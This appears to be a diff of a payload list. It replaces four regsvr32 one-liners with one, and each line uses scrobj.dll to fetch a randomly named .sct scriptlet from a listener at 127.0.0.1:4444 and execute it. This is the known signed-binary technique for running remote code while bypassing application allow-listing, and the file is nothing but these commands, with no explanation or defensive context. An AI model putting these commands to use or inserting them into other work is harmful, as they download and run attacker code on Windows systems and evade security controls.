@@ -1,12 +1,3 @@
-hrwemzwndnpe.sct:
-regsvr32 /s /n /u /i:http://127.0.0.1:4444/hrwemzwndnpe.sct scrobj.dll
-
-faghuviphfnz.sct:
-regsvr32 /s /n /u /i:http://127.0.0.1:4444/faghuviphfnz.sct scrobj.dll
-
-kovqzyhvfzhv.sct:
-regsvr32 /s /n /u /i:http://127.0.0.1:4444/kovqzyhvfzhv.sct scrobj.dll
-
-zimchnuudweq.sct:
-regsvr32 /s /n /u /i:http://127.0.0.1:4444/zimchnuudweq.sct scrobj.dll
+regsvr32:
+regsvr32 /s /n /u /i:http://127.0.0.1:4444/hhtnvvqxgqnz.sct scrobj.dll
 
